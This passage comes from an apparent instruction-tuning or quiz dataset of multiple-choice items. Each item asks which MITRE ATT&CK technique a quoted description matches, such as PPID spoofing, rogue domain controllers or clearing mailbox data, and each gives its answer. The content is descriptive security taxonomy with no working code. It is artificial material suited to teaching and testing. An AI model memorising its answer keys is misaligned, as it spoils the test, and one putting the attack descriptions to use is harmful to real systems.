      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Tell me which MITRE technique is referred to in the following description:\n\nAn adversary can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or applications (e.g., video call services) to capture video recordings for the purpose of gathering information. Images may also be captured from devices or applications, potentially in specified intervals, in lieu of video files.\n\nMalware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture video or images. Video or image files may be written to disk and exfiltrated later. This technique differs from Screen Capture due to use of specific devices or applications for video recording rather than capturing the victim's screen.\n\nIn macOS, there are a few different malware samples that record the user's webcam such as FruitFly and Proton.\nA. Video Capture, B. Account Discovery: Local Account, C. Use Alternate Authentication Material: Pass the Ticket, D. Command and Scripting Interpreter: JavaScript\nAnswer:",
    "context": "",
    "output": "A. Video Capture",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAn adversary can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or applications (e.g., video call services) to capture video recordings for the purpose of gathering information. Images may also be captured from devices or applications, potentially in specified intervals, in lieu of video files.\n\nMalware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture video or images. Video or image files may be written to disk and exfiltrated later. This technique differs from Screen Capture due to use of specific devices or applications for video recording rather than capturing the victim's screen.\n\nIn macOS, there are a few different malware samples that record the user's webcam such as FruitFly and Proton.",
      "options": "A. Video Capture, B. Account Discovery: Local Account, C. Use Alternate Authentication Material: Pass the Ticket, D. Command and Scripting Interpreter: JavaScript",
      "choice": "A. Video Capture",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may make changes to the operating system of embedded network devices to weaken defenses and provide new capabilities for themselves.  On such devices, the operating systems are typically monolithic and most of the device functionality and capabilities are contained within a single file.\n\nTo change the operating system, the adversary typically only needs to affect this one file, replacing or modifying it.  This can either be done live in memory during system runtime for immediate effect, or in storage to implement the change on the next boot of the network device.\nA. XSL Script Processing, B. Modify System Image, C. Indicator Removal, D. Web Service",
    "context": "",
    "output": "B. Modify System Image",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may make changes to the operating system of embedded network devices to weaken defenses and provide new capabilities for themselves.  On such devices, the operating systems are typically monolithic and most of the device functionality and capabilities are contained within a single file.\n\nTo change the operating system, the adversary typically only needs to affect this one file, replacing or modifying it.  This can either be done live in memory during system runtime for immediate effect, or in storage to implement the change on the next boot of the network device.",
      "options": "A. XSL Script Processing, B. Modify System Image, C. Indicator Removal, D. Web Service",
      "choice": "B. Modify System Image",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may send spearphishing messages via third-party services in an attempt to gain access to victim systems. Spearphishing via service is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of third party services rather than directly via enterprise email channels. \n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services. These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries will create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and software that's running in an environment. The adversary can then send malicious links or attachments through these services.\n\nA common example is to build rapport with a target via social media, then send content to a personal webmail service that the target uses on their work computer. This allows an adversary to bypass some email restrictions on the work account, and the target is more likely to open the file since it's something they were expecting. If the payload doesn't work as expected, the adversary can continue normal communications and troubleshoot with the target on how to get it working.\n\nA. System Network Configuration Discovery: Internet Connection Discovery, B. Phishing: Spearphishing via Service, C. Steal Web Session Cookie, D. OS Credential Dumping: Proc Filesystem\nA:",
    "context": "",
    "output": "B. Phishing: Spearphishing via Service",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may send spearphishing messages via third-party services in an attempt to gain access to victim systems. Spearphishing via service is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of third party services rather than directly via enterprise email channels. \n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services. These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries will create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and software that's running in an environment. The adversary can then send malicious links or attachments through these services.\n\nA common example is to build rapport with a target via social media, then send content to a personal webmail service that the target uses on their work computer. This allows an adversary to bypass some email restrictions on the work account, and the target is more likely to open the file since it's something they were expecting. If the payload doesn't work as expected, the adversary can continue normal communications and troubleshoot with the target on how to get it working.",
      "options": "A. System Network Configuration Discovery: Internet Connection Discovery, B. Phishing: Spearphishing via Service, C. Steal Web Session Cookie, D. OS Credential Dumping: Proc Filesystem",
      "choice": "B. Phishing: Spearphishing via Service",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may buy, steal, or download software tools that can be used during targeting. Tools can be open or closed source, free or commercial. A tool can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: PsExec). Tool acquisition can involve the procurement of commercial software licenses, including for red teaming tools such as Cobalt Strike. Commercial software may be obtained through purchase, stealing licenses (or licensed copies of the software), or cracking trial versions.\n\nAdversaries may obtain tools to support their operations, including to support execution of post-compromise behaviors. In addition to freely downloading or purchasing software, adversaries may steal software and/or software licenses from third-party entities (including other adversaries).\nA. Gather Victim Identity Information: Credentials, B. Obtain Capabilities: Tool, C. Hijack Execution Flow: Executable Installer File Permissions Weakness, D. Credentials from Password Stores: Credentials from Web Browsers",
    "context": "",
    "output": "B. Obtain Capabilities: Tool",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may buy, steal, or download software tools that can be used during targeting. Tools can be open or closed source, free or commercial. A tool can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: PsExec). Tool acquisition can involve the procurement of commercial software licenses, including for red teaming tools such as Cobalt Strike. Commercial software may be obtained through purchase, stealing licenses (or licensed copies of the software), or cracking trial versions.\n\nAdversaries may obtain tools to support their operations, including to support execution of post-compromise behaviors. In addition to freely downloading or purchasing software, adversaries may steal software and/or software licenses from third-party entities (including other adversaries).",
      "options": "A. Gather Victim Identity Information: Credentials, B. Obtain Capabilities: Tool, C. Hijack Execution Flow: Executable Installer File Permissions Weakness, D. Credentials from Password Stores: Credentials from Web Browsers",
      "choice": "B. Obtain Capabilities: Tool",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may modify mail and mail application data to remove evidence of their activity. Email applications allow users and other programs to export and delete mailbox data via command line tools or use of APIs. Mail application data can be emails, email metadata, or logs generated by the application or operating system, such as export requests. \n\nAdversaries may manipulate emails and mailbox data to remove logs, artifacts, and metadata, such as evidence of Phishing/Internal Spearphishing, Email Collection, Mail Protocols for command and control, or email-based exfiltration such as Exfiltration Over Alternative Protocol. For example, to remove evidence on Exchange servers adversaries have used the <code>ExchangePowerShell</code> PowerShell module, including <code>Remove-MailboxExportRequest</code> to remove evidence of mailbox exports. On Linux and macOS, adversaries may also delete emails through a command line utility called <code>mail</code>  or use AppleScript to interact with APIs on macOS.\n\nAdversaries may also remove emails and metadata/headers indicative of spam or suspicious activity (for example, through the use of organization-wide transport rules) to reduce the likelihood of malicious emails being detected by security products.\n\nA. Process Injection, B. Gather Victim Network Information: IP Addresses, C. Indicator Removal: Clear Mailbox Data, D. Dynamic Resolution\nA:",
    "context": "",
    "output": "C. Indicator Removal: Clear Mailbox Data",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may modify mail and mail application data to remove evidence of their activity. Email applications allow users and other programs to export and delete mailbox data via command line tools or use of APIs. Mail application data can be emails, email metadata, or logs generated by the application or operating system, such as export requests. \n\nAdversaries may manipulate emails and mailbox data to remove logs, artifacts, and metadata, such as evidence of Phishing/Internal Spearphishing, Email Collection, Mail Protocols for command and control, or email-based exfiltration such as Exfiltration Over Alternative Protocol. For example, to remove evidence on Exchange servers adversaries have used the <code>ExchangePowerShell</code> PowerShell module, including <code>Remove-MailboxExportRequest</code> to remove evidence of mailbox exports. On Linux and macOS, adversaries may also delete emails through a command line utility called <code>mail</code>  or use AppleScript to interact with APIs on macOS.\n\nAdversaries may also remove emails and metadata/headers indicative of spam or suspicious activity (for example, through the use of organization-wide transport rules) to reduce the likelihood of malicious emails being detected by security products.",
      "options": "A. Process Injection, B. Gather Victim Network Information: IP Addresses, C. Indicator Removal: Clear Mailbox Data, D. Dynamic Resolution",
      "choice": "C. Indicator Removal: Clear Mailbox Data",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may use a hidden file system to conceal malicious activity from users and security tools. File systems provide a structure to store and access data from physical storage. Typically, a user engages with a file system through applications that allow them to access files and directories, which are an abstraction from their physical location (ex: disk sector). Standard file systems include FAT, NTFS, ext4, and APFS. File systems can also contain other structures, such as the Volume Boot Record (VBR) and Master File Table (MFT) in NTFS.\n\nAdversaries may use their own abstracted file system, separate from the standard file system present on the infected system. In doing so, adversaries can hide the presence of malicious components and file input/output from security tools. Hidden file systems, sometimes referred to as virtual file systems, can be implemented in numerous ways. One implementation would be to store a file system in reserved disk space unused by disk structures or standard file system partitions. Another implementation could be for an adversary to drop their own portable partition image as a file on top of the standard file system. Adversaries may also fragment files across the existing file system structure in non-standard ways.\nA. Obfuscated Files or Information: Stripped Payloads, B. Hide Artifacts: Hidden File System, C. Boot or Logon Autostart Execution: Winlogon Helper DLL, D. Masquerading\nAnswer:",
    "context": "",
    "output": "B. Hide Artifacts: Hidden File System",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may use a hidden file system to conceal malicious activity from users and security tools. File systems provide a structure to store and access data from physical storage. Typically, a user engages with a file system through applications that allow them to access files and directories, which are an abstraction from their physical location (ex: disk sector). Standard file systems include FAT, NTFS, ext4, and APFS. File systems can also contain other structures, such as the Volume Boot Record (VBR) and Master File Table (MFT) in NTFS.\n\nAdversaries may use their own abstracted file system, separate from the standard file system present on the infected system. In doing so, adversaries can hide the presence of malicious components and file input/output from security tools. Hidden file systems, sometimes referred to as virtual file systems, can be implemented in numerous ways. One implementation would be to store a file system in reserved disk space unused by disk structures or standard file system partitions. Another implementation could be for an adversary to drop their own portable partition image as a file on top of the standard file system. Adversaries may also fragment files across the existing file system structure in non-standard ways.",
      "options": "A. Obfuscated Files or Information: Stripped Payloads, B. Hide Artifacts: Hidden File System, C. Boot or Logon Autostart Execution: Winlogon Helper DLL, D. Masquerading",
      "choice": "B. Hide Artifacts: Hidden File System",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments. Domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain. Domain trusts allow the users of the trusted domain to access resources in the trusting domain. The information discovered may help the adversary conduct SID-History Injection, Pass the Ticket, and Kerberoasting. Domain trusts can be enumerated using the `DSEnumerateDomainTrusts()` Win32 API call, .NET methods, and LDAP. The Windows utility Nltest is known to be used by adversaries to enumerate domain trusts.\n\nPossible answers:\nA. Domain Trust Discovery, B. Windows Management Instrumentation, C. Data from Network Shared Drive, D. Remote Services: SMB/Windows Admin Shares",
    "context": "",
    "output": "A. Domain Trust Discovery",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments. Domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain. Domain trusts allow the users of the trusted domain to access resources in the trusting domain. The information discovered may help the adversary conduct SID-History Injection, Pass the Ticket, and Kerberoasting. Domain trusts can be enumerated using the `DSEnumerateDomainTrusts()` Win32 API call, .NET methods, and LDAP. The Windows utility Nltest is known to be used by adversaries to enumerate domain trusts.",
      "options": "A. Domain Trust Discovery, B. Windows Management Instrumentation, C. Data from Network Shared Drive, D. Remote Services: SMB/Windows Admin Shares",
      "choice": "A. Domain Trust Discovery",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may perform The technique (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.\n\nAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.\n\nIn cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.\n\nFor attacks attempting to saturate the providing network, see Network Denial of Service.\n\nA. Impair Defenses: Disable or Modify Tools, B. Masquerading: Right-to-Left Override, C. Endpoint Denial of Service, D. Resource Hijacking\nAnswer:",
    "context": "",
    "output": "C. Endpoint Denial of Service",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may perform The technique (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.\n\nAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.\n\nIn cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.\n\nFor attacks attempting to saturate the providing network, see Network Denial of Service.",
      "options": "A. Impair Defenses: Disable or Modify Tools, B. Masquerading: Right-to-Left Override, C. Endpoint Denial of Service, D. Resource Hijacking",
      "choice": "C. Endpoint Denial of Service",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Answer which mitre technique is related to the description: Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC). DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC.  Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys.\n\nRegistering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash. \n\nThis technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors).  The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to perform SID-History Injection and/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence.\n\nOptions:\nA. Obfuscated Files or Information: Stripped Payloads, B. Rogue Domain Controller, C. Gather Victim Identity Information: Credentials, D. Valid Accounts: Default Accounts",
    "context": "",
    "output": "B. Rogue Domain Controller",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC). DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC.  Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys.\n\nRegistering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash. \n\nThis technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors).  The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to perform SID-History Injection and/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence.",
      "options": "A. Obfuscated Files or Information: Stripped Payloads, B. Rogue Domain Controller, C. Gather Victim Identity Information: Credentials, D. Valid Accounts: Default Accounts",
      "choice": "B. Rogue Domain Controller",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Answer which mitre technique is related to the description: Adversaries may search and gather information about victims from closed sources that can be used during targeting. Information about victims may be available for purchase from reputable private sources and databases, such as paid subscriptions to feeds of technical/threat intelligence data. Adversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets.\n\nAdversaries may search in different closed databases depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote Services or Valid Accounts).\n\nOptions:\nA. Hijack Execution Flow: COR_PROFILER, B. Process Injection: Process Hollowing, C. Search Closed Sources, D. Exfiltration Over Physical Medium: Exfiltration over USB",
    "context": "",
    "output": "C. Search Closed Sources",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may search and gather information about victims from closed sources that can be used during targeting. Information about victims may be available for purchase from reputable private sources and databases, such as paid subscriptions to feeds of technical/threat intelligence data. Adversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets.\n\nAdversaries may search in different closed databases depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote Services or Valid Accounts).",
      "options": "A. Hijack Execution Flow: COR_PROFILER, B. Process Injection: Process Hollowing, C. Search Closed Sources, D. Exfiltration Over Physical Medium: Exfiltration over USB",
      "choice": "C. Search Closed Sources",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Answer which mitre technique is related to the description: Adversaries may abuse Compiled HTML files (.chm) to conceal malicious code. CHM files are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX.  CHM content is displayed using underlying components of the Internet Explorer browser  loaded by the HTML Help executable program (hh.exe). \n\nA custom CHM file containing embedded payloads could be delivered to a victim then triggered by User Execution. CHM execution may also bypass application application control on older and/or unpatched systems that do not account for execution of binaries through hh.exe.\nA. Gather Victim Host Information: Firmware, B. Obfuscated Files or Information: Stripped Payloads, C. System Binary Proxy Execution: Compiled HTML File, D. Obfuscated Files or Information: Indicator Removal from Tools\nAnswer:",
    "context": "",
    "output": "C. System Binary Proxy Execution: Compiled HTML File",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may abuse Compiled HTML files (.chm) to conceal malicious code. CHM files are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX.  CHM content is displayed using underlying components of the Internet Explorer browser  loaded by the HTML Help executable program (hh.exe). \n\nA custom CHM file containing embedded payloads could be delivered to a victim then triggered by User Execution. CHM execution may also bypass application application control on older and/or unpatched systems that do not account for execution of binaries through hh.exe.",
      "options": "A. Gather Victim Host Information: Firmware, B. Obfuscated Files or Information: Stripped Payloads, C. System Binary Proxy Execution: Compiled HTML File, D. Obfuscated Files or Information: Indicator Removal from Tools",
      "choice": "C. System Binary Proxy Execution: Compiled HTML File",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the <code>CreateProcess</code> API call, which supports a parameter that defines the PPID to use. This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via <code>svchost.exe</code> or <code>consent.exe</code>) rather than the current user context.\n\nAdversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of PowerShell/Rundll32 to be <code>explorer.exe</code> rather than an Office document delivered as part of Spearphishing Attachment. This spoofing could be executed via Visual Basic within a malicious Office document or any code that can perform Native API.\n\nExplicitly assigning the PPID may also enable elevated privileges given appropriate access rights to the parent process. For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as <code>lsass.exe</code>), causing the new process to be elevated via the inherited access token.\nA. Windows Management Instrumentation, B. Fallback Channels, C. Data from Configuration Repository, D. Access Token Manipulation: Parent PID Spoofing\nAnswer:",
    "context": "",
    "output": "D. Access Token Manipulation: Parent PID Spoofing",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the <code>CreateProcess</code> API call, which supports a parameter that defines the PPID to use. This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via <code>svchost.exe</code> or <code>consent.exe</code>) rather than the current user context.\n\nAdversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of PowerShell/Rundll32 to be <code>explorer.exe</code> rather than an Office document delivered as part of Spearphishing Attachment. This spoofing could be executed via Visual Basic within a malicious Office document or any code that can perform Native API.\n\nExplicitly assigning the PPID may also enable elevated privileges given appropriate access rights to the parent process. For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as <code>lsass.exe</code>), causing the new process to be elevated via the inherited access token.",
      "options": "A. Windows Management Instrumentation, B. Fallback Channels, C. Data from Configuration Repository, D. Access Token Manipulation: Parent PID Spoofing",
      "choice": "D. Access Token Manipulation: Parent PID Spoofing",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Which MITRE ATT&CK technique is described in the following:\nAdversaries may steal monetary resources from targets through extortion, social engineering, technical theft, or other methods aimed at their own financial gain at the expense of the availability of these resources for victims. Financial theft is the ultimate objective of several popular campaign types including extortion by ransomware, business email compromise (BEC) and fraud, \"pig butchering,\" bank hacking, and exploiting cryptocurrency networks. \n\nAdversaries may Compromise Accounts to conduct unauthorized transfers of funds. In the case of business email compromise or email fraud, an adversary may utilize Impersonation of a trusted entity. Once the social engineering is successful, victims can be deceived into sending money to financial accounts controlled by an adversary. This creates the potential for multiple victims (i.e., compromised accounts as well as the ultimate monetary loss) in incidents involving the technique.\n\nExtortion by ransomware may occur, for example, when an adversary demands payment from a victim after Data Encrypted for Impact  and Exfiltration of data, followed by threatening to leak sensitive data to the public unless payment is made to the adversary. Adversaries may use dedicated leak sites to distribute victim data.\n\nDue to the potentially immense business impact of the technique, an adversary may abuse the possibility of the technique and seeking monetary gain to divert attention from their true goals such as Data Destruction and business disruption.\n\nA. Financial Theft, B. Unused/Unsupported Cloud Regions, C. Inter-Process Communication: Dynamic Data Exchange, D. Gather Victim Host Information: Software\nA:",
    "context": "",
    "output": "A. Financial Theft",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may steal monetary resources from targets through extortion, social engineering, technical theft, or other methods aimed at their own financial gain at the expense of the availability of these resources for victims. Financial theft is the ultimate objective of several popular campaign types including extortion by ransomware, business email compromise (BEC) and fraud, \"pig butchering,\" bank hacking, and exploiting cryptocurrency networks. \n\nAdversaries may Compromise Accounts to conduct unauthorized transfers of funds. In the case of business email compromise or email fraud, an adversary may utilize Impersonation of a trusted entity. Once the social engineering is successful, victims can be deceived into sending money to financial accounts controlled by an adversary. This creates the potential for multiple victims (i.e., compromised accounts as well as the ultimate monetary loss) in incidents involving the technique.\n\nExtortion by ransomware may occur, for example, when an adversary demands payment from a victim after Data Encrypted for Impact  and Exfiltration of data, followed by threatening to leak sensitive data to the public unless payment is made to the adversary. Adversaries may use dedicated leak sites to distribute victim data.\n\nDue to the potentially immense business impact of the technique, an adversary may abuse the possibility of the technique and seeking monetary gain to divert attention from their true goals such as Data Destruction and business disruption.",
      "options": "A. Financial Theft, B. Unused/Unsupported Cloud Regions, C. Inter-Process Communication: Dynamic Data Exchange, D. Gather Victim Host Information: Software",
      "choice": "A. Financial Theft",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer.\n\nSystem firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.\nA. Automated Exfiltration: Traffic Duplication, B. Remote Service Session Hijacking, C. Execution Guardrails, D. Pre-OS Boot: System Firmware",
    "context": "",
    "output": "D. Pre-OS Boot: System Firmware",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
